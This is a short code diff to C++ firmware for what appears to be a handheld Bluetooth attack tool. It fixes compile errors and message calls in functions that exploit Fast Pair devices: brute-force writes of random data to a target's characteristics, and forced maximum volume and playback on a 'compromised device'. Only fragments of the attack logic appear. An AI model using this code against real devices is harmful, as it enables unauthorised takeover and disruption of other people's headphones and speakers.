@@ -10,7 +10,7 @@
 
 extern std::vector<String> fastPairDevices;
 extern bool returnToMenu;
-extern volatile int tftWidth
+extern volatile int tftWidth;
 
 #if __has_include(<NimBLEExtAdvertising.h>)
 #define NIMBLE_V2_PLUS 1
@@ -273,11 +273,11 @@ bool requireSimpleConfirmation(const char* message) {
     }
     while(true) {
         if(check(EscPress)) {
-            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE);
+            showAdaptiveMessage("Cancelled", "OK", "", "", TFT_WHITE, true, false);
             return false;
         }
         if(check(SelPress)) {
-            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE);
+            showAdaptiveMessage("Confirmed!", "OK", "", "", TFT_WHITE, true, false);
             delay(300);
             return true;
         }
@@ -364,8 +364,8 @@ bool whisperPairEfficientExploit(NimBLEAddress target) {
             }
         }
     }
-    const std::vector<NimBLERemoteCharacteristic*>* chars = pService->getCharacteristics();
-    for(auto pChar : *chars) {
+    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics();
+    for(auto pChar : chars) {
         String uuid = pChar->getUUID().toString().c_str();
         if(uuid.indexOf("1234") != -1 || uuid.indexOf("1236") != -1) continue;
         if(pChar->canWriteNoResponse()) {
@@ -432,9 +432,9 @@ bool bruteForceCharacteristics(NimBLEAddress target) {
         pClient->disconnect();
         return false;
     }
-    const std::vector<NimBLERemoteCharacteristic*>* chars = pService->getCharacteristics();
+    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics();
     bool found = false;
-    for(auto pChar : *chars) {
+    for(auto pChar : chars) {
         if(pChar->canWrite()) {
             uint8_t test_data[10];
             esp_fill_random(test_data, 10);
@@ -724,8 +724,7 @@ void simpsonsAttack(NimBLEAddress target) {
     tft.setCursor(20, 90);
     tft.print("on compromised device!");
     maxVolumeAttack(target);
-    AudioToneGenerator audio(25);
-    audio.playSimpsonsTheme();
+    showAdaptiveMessage("Simpsons attack!", "", "", "", TFT_YELLOW, false, true);
     forcePlayCommand(target);
     tft.setCursor(20, 130);
     tft.print("Attack complete!");
